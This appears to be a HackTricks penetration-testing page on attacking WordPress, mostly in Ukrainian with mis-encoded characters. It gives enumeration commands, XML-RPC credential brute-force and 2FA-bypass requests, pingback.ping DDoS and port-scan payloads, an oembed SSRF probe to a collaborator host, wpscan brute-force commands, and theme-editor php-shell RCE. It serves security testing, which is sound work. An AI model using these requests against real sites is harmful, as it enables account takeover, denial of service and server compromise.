# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

- **Uploaded** —Ñ–∞–π–ª–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è —É: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **–§–∞–π–ª–∏ —Ç–µ–º –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ /wp-content/themes/,** —Ç–æ–∂ —è–∫—â–æ –≤–∏ –∑–º—ñ–Ω–∏—Ç–µ —è–∫–∏–π—Å—å php —É —Ç–µ–º—ñ, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE, –≤–∏, –π–º–æ–≤—ñ—Ä–Ω–æ, –±—É–¥–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π —à–ª—è—Ö. –ù–∞–ø—Ä–∏–∫–ª–∞–¥: –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **theme twentytwelve** –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ñ–∞–π–ª—É **404.php** –∑–∞ –∞–¥—Ä–µ—Å–æ—é: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **–©–µ –æ–¥–Ω–∞ –∫–æ—Ä–∏—Å–Ω–∞ url-–∞–¥—Ä–µ—Å–∞ –º–æ–∂–µ –±—É—Ç–∏:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- –£ **wp-config.php** –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ root-–ø–∞—Ä–æ–ª—å –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.
- –¢–∏–ø–æ–≤—ñ —à–ª—è—Ö–∏ –≤—Ö–æ–¥—É –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` –º—ñ—Å—Ç–∏—Ç—å –∫–æ—Ä–∏—Å–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ –≤–µ—Ä—Å—ñ—é –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ–≥–æ WordPress.
- `wp-activate.php` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø—Ä–æ—Ü–µ—Å—É –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –ø–æ email –ø—ñ–¥ —á–∞—Å –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –Ω–æ–≤–æ–≥–æ —Å–∞–π—Ç—É WordPress.
- –ü–∞–ø–∫–∏ –≤—Ö–æ–¥—É (–º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø–µ—Ä–µ–π–º–µ–Ω–æ–≤–∞–Ω—ñ, —â–æ–± —Å—Ö–æ–≤–∞—Ç–∏):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ‚Äî —Ñ–∞–π–ª, —â–æ —Ä–µ–∞–ª—ñ–∑—É—î —Ñ—É–Ω–∫—Ü—ñ—é WordPress –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ –¥–∞–Ω–∏—Ö –∑ HTTP —è–∫ —Ç—Ä–∞–Ω—Å–ø–æ—Ä—Ç–æ–º —Ç–∞ XML —è–∫ –º–µ—Ö–∞–Ω—ñ–∑–º–æ–º –∫–æ–¥—É–≤–∞–Ω–Ω—è. –¶–µ–π —Ç–∏–ø –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó –±—É–≤ –∑–∞–º—ñ–Ω–µ–Ω–∏–π WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- –ü–∞–ø–∫–∞ `wp-content` ‚Äî –≥–æ–ª–æ–≤–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è plugins —ñ themes.
- `wp-content/uploads/` ‚Äî –∫–∞—Ç–∞–ª–æ–≥, –∫—É–¥–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è —Ñ–∞–π–ª–∏, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –Ω–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º—É.
- `wp-includes/` ‚Äî –∫–∞—Ç–∞–ª–æ–≥, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –æ—Å–Ω–æ–≤–Ω—ñ —Ñ–∞–π–ª–∏, —Ç–∞–∫—ñ —è–∫ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏, —à—Ä–∏—Ñ—Ç–∏, JavaScript-—Ñ–∞–π–ª–∏ —Ç–∞ –≤—ñ–¥–∂–µ—Ç–∏.
- `wp-sitemap.xml` –£ –≤–µ—Ä—Å—ñ—è—Ö WordPress 5.5 —ñ –≤–∏—â–µ WordPress –≥–µ–Ω–µ—Ä—É—î sitemap XML —Ñ–∞–π–ª –∑—ñ –≤—Å—ñ–º–∞ –ø—É–±–ª—ñ—á–Ω–∏–º–∏ –∑–∞–ø–∏—Å–∞–º–∏ —Ç–∞ –ø—É–±–ª—ñ—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–∏–º–∏ —Ç–∏–ø–∞–º–∏ –∑–∞–ø–∏—Å—ñ–≤ —ñ —Ç–∞–∫—Å–æ–Ω–æ–º—ñ—è–º–∏.

**Post exploitation**

- –§–∞–π–ª `wp-config.php` –º—ñ—Å—Ç–∏—Ç—å —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –Ω–µ–æ–±—Ö—ñ–¥–Ω—É WordPress –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —Ç–∞–∫—É —è–∫ –Ω–∞–∑–≤–∞ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —Ö–æ—Å—Ç –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —ñ –ø–∞—Ä–æ–ª—å, authentication keys and salts, —Ç–∞ –ø—Ä–µ—Ñ—ñ–∫—Å —Ç–∞–±–ª–∏—Ü—å –±–∞–∑–∏ –¥–∞–Ω–∏—Ö. –¶–µ–π –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π —Ñ–∞–π–ª —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó DEBUG-—Ä–µ–∂–∏–º—É, —â–æ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º –ø—Ä–∏ —É—Å—É–Ω–µ–Ω–Ω—ñ –Ω–µ—Å–ø—Ä–∞–≤–Ω–æ—Å—Ç–µ–π.

### –ü—Ä–∞–≤–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤

- **Administrator**
- **Editor**: –ü—É–±–ª—ñ–∫—É—î —Ç–∞ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ –π —á—É–∂–∏–º–∏ –∑–∞–ø–∏—Å–∞–º–∏
- **Author**: –ü—É–±–ª—ñ–∫—É—î —ñ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ –∑–∞–ø–∏—Å–∞–º–∏
- **Contributor**: –ü–∏—à–µ —ñ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ –∑–∞–ø–∏—Å–∞–º–∏, –∞–ª–µ –Ω–µ –º–æ–∂–µ —ó—Ö –ø—É–±–ª—ñ–∫—É–≤–∞—Ç–∏
- **Subscriber**: –ü–µ—Ä–µ–≥–ª—è–¥–∞—î –∑–∞–ø–∏—Å–∏ —ñ —Ä–µ–¥–∞–≥—É—î —Å–≤—ñ–π –ø—Ä–æ—Ñ—ñ–ª—å

## **Passive Enumeration**

### **Get WordPress version**

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —Ñ–∞–π–ª–∏ `/license.txt` –∞–±–æ `/readme.html`

–£ **–≤–∏—Ö—ñ–¥–Ω–æ–º—É –∫–æ–¥—ñ** —Å—Ç–æ—Ä—ñ–Ω–∫–∏ (–ø—Ä–∏–∫–ª–∞–¥ –∑ [https://wordpress.org/support/article/pages/]):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link —Ñ–∞–π–ª–∏

![](<../../images/image (533).png>)

- JavaScript —Ñ–∞–π–ª–∏

![](<../../images/image (524).png>)

### –û—Ç—Ä–∏–º–∞—Ç–∏ –ø–ª–∞–≥—ñ–Ω–∏
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### –û—Ç—Ä–∏–º–∞—Ç–∏ —Ç–µ–º–∏
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### –û—Ç—Ä–∏–º–∞–Ω–Ω—è –≤–µ—Ä—Å—ñ–π –∑–∞–≥–∞–ª–æ–º
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## –ê–∫—Ç–∏–≤–Ω–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è

### Plugins and Themes

–Ü–º–æ–≤—ñ—Ä–Ω–æ, –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –≤—Å—ñ –¥–æ—Å—Ç—É–ø–Ω—ñ Plugins and Themes. –©–æ–± –≤–∏—è–≤–∏—Ç–∏ —ó—Ö —É—Å—ñ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ **actively Brute Force a list of Plugins and Themes** (–Ω–∞ —â–∞—Å—Ç—è, —ñ—Å–Ω—É—é—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —è–∫—ñ –º—ñ—Å—Ç—è—Ç—å —Ü—ñ —Å–ø–∏—Å–∫–∏).

### –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ

- **ID Brute:** –í–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ –¥—ñ–π—Å–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ WordPress-—Å–∞–π—Ç—É —à–ª—è—Ö–æ–º Brute Forcing ID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
–Ø–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ ‚Äî **200** –∞–±–æ **30X**, —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ id —î **–¥—ñ–π—Å–Ω–∏–º**. –Ø–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å ‚Äî **400**, —Ç–æ id —î **–Ω–µ–¥—ñ–π—Å–Ω–∏–º**.

- **wp-json:** –í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –∑—Ä–æ–±–∏–≤—à–∏ –∑–∞–ø–∏—Ç:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
–©–µ –æ–¥–∏–Ω `/wp-json/` endpoint, —è–∫–∏–π –º–æ–∂–µ –≤–∏—è–≤–∏—Ç–∏ –¥–µ—è–∫—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **–ë—É–¥—É—Ç—å –Ω–∞–¥–∞–Ω—ñ –ª–∏—à–µ –¥–∞–Ω—ñ –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —É —è–∫–∏—Ö —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è —É–≤—ñ–º–∫–Ω–µ–Ω–∞**.

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: –ü—ñ–¥ —á–∞—Å –≤—Ö–æ–¥—É —á–µ—Ä–µ–∑ **`/wp-login.php`** **–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è** **–≤—ñ–¥—Ä—ñ–∑–Ω—è—î—Ç—å—Å—è**, –≤–∫–∞–∑—É—é—á–∏, —á–∏ **username** —ñ—Å–Ω—É—î —á–∏ –Ω—ñ.

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (–í–∏ –º–æ–∂–µ—Ç–µ –∞–≤—Ç–æ–º–∞—Ç–∏–∑—É–≤–∞—Ç–∏ —Ü–µ–π –ø—Ä–æ—Ü–µ—Å [using this](https://github.com/relarizky/wpxploit) –Ω–∞–ø—Ä–∏–∫–ª–∞–¥).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** –∞–±–æ **`metaWeblog.getUsersBlogs`** ‚Äî —Ü–µ –¥–µ—è–∫—ñ –º–µ—Ç–æ–¥–∏, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è brute-force credentials. –Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –±—É–¥—å-—è–∫–∏–π —ñ–∑ –Ω–∏—Ö, –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ —â–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
–ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è _"Incorrect username or password"_ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑ –∫–æ–¥–æ–º 200 –º–∞—î –∑'—è–≤–ª—è—Ç–∏—Å—è, —è–∫—â–æ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –Ω–µ–¥—ñ–π—Å–Ω—ñ.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø—Ä–∞–≤–∏–ª—å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª. –£ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑'—è–≤–∏—Ç—å—Å—è —à–ª—è—Ö ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
–¢–∞–∫–æ–∂ —ñ—Å–Ω—É—î **—à–≤–∏–¥—à–∏–π —Å–ø–æ—Å—ñ–±** –±—Ä—É—Ç—Ñ–æ—Ä—Å—É –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **`system.multicall`**, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –∫—ñ–ª—å–∫–∞ –∫–æ–º–±—ñ–Ω–∞—Ü—ñ–π —É –æ–¥–Ω–æ–º—É –∑–∞–ø–∏—Ç—ñ:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**–û–±—Ö—ñ–¥ 2FA**

–¶–µ–π –º–µ—Ç–æ–¥ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –ø—Ä–æ–≥—Ä–∞–º, –∞ –Ω–µ –¥–ª—è –ª—é–¥–µ–π, —ñ –≤—ñ–Ω —Å—Ç–∞—Ä–∏–π, —Ç–æ–º—É –Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—î 2FA. –û—Ç–∂–µ, —è–∫—â–æ —É –≤–∞—Å —î –¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –∞–ª–µ –æ—Å–Ω–æ–≤–Ω–∏–π –≤—Ö—ñ–¥ –∑–∞—Ö–∏—â–µ–Ω–æ 2FA, **–≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ xmlrpc.php, —â–æ–± —É–≤—ñ–π—Ç–∏ –∑ —Ü–∏–º–∏ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –¥–∞–Ω–∏–º–∏, –æ–±—Ö–æ–¥—è—á–∏ 2FA**. –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –≤—Å—ñ –¥—ñ—ó, –¥–æ—Å—Ç—É–ø–Ω—ñ —á–µ—Ä–µ–∑ –∫–æ–Ω—Å–æ–ª—å, –∞–ª–µ –≤—Å–µ —â–µ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE, —è–∫ Ippsec –ø–æ—è—Å–Ω—é—î –≤ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS –∞–±–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤**

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –º–µ—Ç–æ–¥ _**pingback.ping**_ —É —Å–ø–∏—Å–∫—É, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ Wordpress –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∑–∞–ø–∏—Ç –Ω–∞ –±—É–¥—å-—è–∫–∏–π —Ö–æ—Å—Ç/–ø–æ—Ä—Ç.\
–¶–µ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏, —â–æ–± –∑–º—É—Å–∏—Ç–∏ **—Ç–∏—Å—è—á—ñ** Wordpress **—Å–∞–π—Ç—ñ–≤** –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ –æ–¥–Ω–æ–≥–æ **—Ä–µ—Å—É—Ä—Å—É** (–≤–Ω–∞—Å–ª—ñ–¥–æ–∫ —á–æ–≥–æ –≤ —Ç–æ–º—É –º—ñ—Å—Ü—ñ —Å–ø—Ä–∏—á–∏–Ω–∏—Ç—å—Å—è **DDoS**), –∞–±–æ –∂ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –π–æ–≥–æ, —â–æ–± –∑–º—É—Å–∏—Ç–∏ **Wordpress** **—Å–∫–∞–Ω—É–≤–∞—Ç–∏** –≤–Ω—É—Ç—Ä—ñ—à–Ω—é **–º–µ—Ä–µ–∂—É** (–º–æ–∂–Ω–∞ –≤–∫–∞–∑–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π –ø–æ—Ä—Ç).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ **faultCode** –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è–º **–±—ñ–ª—å—à–µ** –Ω—ñ–∂ **0** (17), —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –ø–æ—Ä—Ç –≤—ñ–¥–∫—Ä–∏—Ç–∏–π.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **`system.multicall`** –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º –º–µ—Ç–æ–¥–æ–º –¥–ª—è —Å–ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—è DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

This file usually exists under the root of the Wordpress site: **`/wp-cron.php`**\
–ö–æ–ª–∏ —Ü–µ–π —Ñ–∞–π–ª **accessed** –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è ¬´–≤–∞–∂–∫–∏–π¬ª MySQL **query**, —Ç–æ–º—É –π–æ–≥–æ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **attackers** –¥–ª—è —Å–ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—è **DoS**.\
–¢–∞–∫–æ–∂, –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, `wp-cron.php` –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –ø—Ä–∏ –∫–æ–∂–Ω–æ–º—É –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ (–∫–æ–ª–∏ –∫–ª—ñ—î–Ω—Ç –∑–∞–ø–∏—Ç—É—î –±—É–¥—å-—è–∫—É —Å—Ç–æ—Ä—ñ–Ω–∫—É Wordpress), —â–æ –Ω–∞ —Å–∞–π—Ç–∞—Ö –∑ –≤–µ–ª–∏–∫–∏–º —Ç—Ä–∞—Ñ—ñ–∫–æ–º –º–æ–∂–µ —Å–ø—Ä–∏—á–∏–Ω—è—Ç–∏ –ø—Ä–æ–±–ª–µ–º–∏ (DoS).

–†–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤—ñ–¥–∫–ª—é—á–∏—Ç–∏ Wp-Cron —ñ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ä–µ–∞–ª—å–Ω–∏–π cronjob –Ω–∞ —Ö–æ—Å—Ç—ñ, —è–∫–∏–π –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏–º–µ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥—ñ—ó –∑ —Ä–µ–≥—É–ª—è—Ä–Ω–∏–º —ñ–Ω—Ç–µ—Ä–≤–∞–ª–æ–º (–±–µ–∑ —Å–ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—è –ø—Ä–æ–±–ª–µ–º).

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ and the Worpress site may make a request to you.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

–¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ —ñ—Å–Ω—É—î **methodName: pingback.ping** —ñ —à–ª—è—Ö **/wp-json/oembed/1.0/proxy**, —ñ —è–∫—â–æ —ñ—Å–Ω—É—é—Ç—å ‚Äî –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è —ó—Ö –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏.

## –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## –û—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø, –ø–µ—Ä–µ–ø–∏—Å–∞–≤—à–∏ –±—ñ—Ç

–°–∫–æ—Ä—ñ—à–µ —Ü—ñ–∫–∞–≤–∏–Ω–∫–∞, –Ω—ñ–∂ —Ä–µ–∞–ª—å–Ω–∞ –∞—Ç–∞–∫–∞. –£ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) –º–æ–∂–Ω–∞ –±—É–ª–æ —ñ–Ω–≤–µ—Ä—Ç—É–≤–∞—Ç–∏ 1 –±—ñ—Ç —É –±—É–¥—å-—è–∫–æ–º—É wordpress-—Ñ–∞–π–ª—ñ. –û—Ç–∂–µ, –º–æ–∂–Ω–∞ –±—É–ª–æ —ñ–Ω–≤–µ—Ä—Ç—É–≤–∞—Ç–∏ –ø–æ–∑–∏—Ü—ñ—é `5389` —Ñ–∞–π–ª—É `/var/www/html/wp-includes/user.php`, —â–æ–± NOP–Ω—É—Ç–∏ –æ–ø–µ—Ä–∞—Ü—ñ—é NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **–ü–∞–Ω–µ–ª—å RCE**

**–ú–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è php –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω–æ—ó —Ç–µ–º–∏ (–ø–æ—Ç—Ä—ñ–±–Ω—ñ admin credentials)**

Appearance ‚Üí Theme Editor ‚Üí 404 Template (–ø—Ä–∞–≤–æ—Ä—É—á)

–ó–º—ñ–Ω—ñ—Ç—å –≤–º—ñ—Å—Ç –Ω–∞ php shell:

![](<../../images/image (384).png>)

